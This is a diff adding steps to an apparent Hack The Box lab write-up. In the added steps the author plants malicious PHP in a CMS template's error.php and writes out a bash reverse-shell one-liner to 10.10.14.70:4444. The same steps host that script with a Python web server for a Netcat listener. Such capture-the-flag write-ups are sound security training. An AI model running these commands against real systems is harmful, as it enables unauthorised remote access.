@@ -81,3 +81,19 @@ When we exploit this we get a leak of information, in this information we discov
 Now with these credentials we can gain access to that admin portal we discovered earlier.
 
 ![5](https://github.com/marcusdjr/HTBBoxes/assets/31329300/5aa265c0-c86c-430e-8aa6-f821f938f88d)
+
+If we navigate to System > Site Templates > Cassiopeia Details and Files, we can see current template contents.
+
+Lets attatch malicious PHP code to the end of error.php that'll enable us to get a shell.
+
+After adding our payload, save the file and then lets host the bash script that will be downloaded and executed on the target.
+
+    echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.70/4444 0>&1' > rev.sh
+
+The above one-liner command will create a bash script named rev.sh in our current working
+directory; this is what we will use to initiate the reverse shell connection to our Netcat listener.
+We then start a Python web server on our local machine on port 8080 to host the file
+
+    python3 -m http.server 8080
+
+Now lets start a Netcat listener to catch the reverse shell connection once the script executes..
